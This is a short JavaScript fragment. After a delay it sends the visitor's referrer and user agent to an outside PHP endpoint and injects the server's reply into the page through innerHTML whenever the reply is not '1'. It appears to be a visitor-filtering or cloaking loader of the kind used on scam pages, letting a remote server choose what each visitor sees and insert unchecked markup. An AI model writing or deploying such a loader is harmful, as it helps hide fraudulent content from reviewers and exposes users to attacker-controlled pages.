
setTimeout(function(){ start(); }, 3000);
				
				function start()
				{
					
	var url="https://mavibeyazfirsat.co/calis/isp.php";
var ref=encodeURIComponent(document.referrer);
var userag=encodeURIComponent(navigator.userAgent);

var xhr = new XMLHttpRequest();
                xhr.open("GET", url+"?ref="+ref+"&userag="+userag, true);
                xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function() {
                    if (xhr.readyState == 4 && xhr.status == 200) {
			   
						data=xhr.responseText;
						if(data !== "1")
						{document.getElementById("sonuc").innerHTML=data;}
                    }
                }
                xhr.send();
				}
